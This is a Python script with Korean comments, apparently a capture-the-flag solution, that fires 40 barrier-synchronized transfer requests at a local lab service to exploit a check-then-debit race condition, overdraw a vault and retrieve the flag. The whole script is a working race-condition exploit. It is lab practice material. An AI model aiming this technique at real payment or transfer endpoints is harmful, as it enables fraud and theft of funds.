#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""race-transfer — 검증/차감 사이 경합(TOCTOU)으로 오버드래프트.
/reset 후 /transfer?amt=100 을 동시에 다발 전송 → 다수가 검증을 함께 통과 → vault≥1000.

사용:  python race_transfer.py            # 기본 http://localhost:9401, 40 동시요청
       python race_transfer.py http://localhost:9401 40
"""
import threading, urllib.request, re, sys

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:9401").rstrip("/")
N = int(sys.argv[2]) if len(sys.argv) > 2 else 40

def hit():
    try: urllib.request.urlopen(BASE + "/transfer?amt=100", timeout=10).read()
    except Exception: pass

def main():
    urllib.request.urlopen(BASE + "/reset", timeout=10).read()
    bar = threading.Barrier(N)
    def fire():
        bar.wait(); hit()                    # 동시에 발사
    ts = [threading.Thread(target=fire) for _ in range(N)]
    [t.start() for t in ts]; [t.join() for t in ts]
    r = urllib.request.urlopen(BASE + "/flag", timeout=10).read().decode()
    m = re.search(r"flag\{[^}]+\}", r)
    print("[+]", m.group(0) if m else r)

if __name__ == "__main__":
    main()
